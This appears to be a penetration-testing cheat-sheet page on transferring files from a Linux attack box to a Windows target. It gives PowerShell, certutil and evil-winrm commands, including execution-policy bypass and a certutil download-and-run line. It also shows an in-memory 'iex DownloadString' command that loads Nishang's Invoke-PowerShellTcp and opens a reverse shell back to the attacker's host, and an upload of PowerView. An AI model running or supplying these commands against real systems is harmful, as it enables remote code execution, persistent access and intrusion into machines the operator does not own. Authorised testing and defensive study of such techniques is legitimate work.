---
title: "File Transfer (Linux to Windows)"
date: 2024-6-26
tags: ["Curl", "Http File Transfer", "File Transfer", "Windows", "Evil-Winrm", "IEX", "IWR", "certutil"]
---

{{< tab set1 tab1 >}}Powershell{{< /tab >}}
{{< tab set1 tab2 >}}cmd{{< /tab >}}
{{< tab set1 tab3 >}}evil-winrm{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### Start a Local HTTP Server

```console
python3 -m http.server <LOCAL_PORT>
```

```console {class=sample-code}
$ python3 -m http.server 8443
Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ...
```

<br>

```console
# Invoke-WebRequest
iwr http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> -o C:\ProgramData\<FILE>
```

```console
# Wget
powershell -ep bypass wget <LOCAL_IP>:<LOCAL_PORT>/<FILE> -Outfile C:\ProgramData\<FILE>
```

```console
# Curl
powershell -ep bypass curl <LOCAL_IP>:<LOCAL_PORT>/<FILE> -Outfile C:\ProgramData\<FILE>
```

<small>*Note: curl and wget are alias to Invoke-WebRequest*</small>

```console
# Load into memory and Run
```

```console
# Invoke-Expression
iex (New-Object Net.WebClient).DownloadString('http://<LOCAL_IP>:<LOCAL_PORT>/<FILE>');Invoke-PowerShellTcp -Reverse -IPAddress <LOCAL_IP> -Port <LOCAL_PORT>
```

```console
# Short version
iex (iwr http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> -UseBasicParsing)
```

<small>*Ref: [rev.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### Start a Local HTTP Server

```console
python3 -m http.server <LOCAL_PORT>
```

<br>

```console
certutil -urlcache -split -f http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> C:\ProgramData\<FILE>
```

```console
# Upload and Run
certutil -urlcache -split -f http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> C:\ProgramData\<FILE> && C:\ProgramData\<FILE>
```

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

```console
# Evil-winrm built-in function
upload '<LOCAL_FILE_PATH>' "C:\ProgramData\<FILE>"
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> upload /home/kali/PowerView.ps1 C:\ProgramData\PowerView.ps1
                                        
Info: Uploading /home/kali/PowerView.ps1 to C:\ProgramData\PowerView.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
```

{{< /tabcontent >}}
